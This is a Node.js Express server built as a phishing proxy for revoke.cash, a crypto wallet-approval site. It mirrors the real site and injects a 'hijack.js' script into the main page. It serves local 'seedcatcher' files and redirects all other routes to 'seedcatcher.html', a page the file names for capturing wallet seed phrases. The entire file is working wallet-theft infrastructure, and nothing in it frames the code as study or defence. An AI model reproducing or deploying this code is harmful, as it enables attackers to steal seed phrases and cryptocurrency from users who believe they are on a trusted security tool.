const express = require('express');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const app = express();
const port = process.env.PORT || 8080;

// Proxy all assets (CSS, JS, images, 3D models) and strip CORS
app.use(async (req, res, next) => {
    // 1. Check if the requested file exists locally in the container
    const localFile = path.join(__dirname, req.path);
    if (fs.existsSync(localFile) && fs.lstatSync(localFile).isFile()) {
        return res.sendFile(localFile); // Serve local file (seedcatcher, hijack)
    }

    // 2. If it doesn't exist locally, proxy it to revoke.cash
    try {
        const url = 'https://revoke.cash' + req.originalUrl;
        const response = await axios({
            method: req.method,
            url: url,
            responseType: 'stream',
            headers: { 
                ...req.headers, 
                host: 'revoke.cash',
                'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1'
            }
        });
        
        res.setHeader('Access-Control-Allow-Origin', '*');
        
        // If it's the main HTML page, inject the hijack script
        if (req.path === '/' || req.path === '/index.html') {
            let html = '';
            response.data.on('data', chunk => html += chunk);
            response.data.on('end', () => {
                if (html.includes('</body>')) {
                    html = html.replace('</body>', '<script src="/hijack.js"></script></body>');
                }
                res.send(html);
            });
        } else {
            // If it's an asset, just pipe it straight through
            response.data.pipe(res);
        }
    } catch (error) {
        next(); // If it fails, move to the next route
    }
});

// Catch any leftover routes and send them to the catcher
app.get('*', (req, res) => {
    res.redirect('/seedcatcher.html');
});

app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});
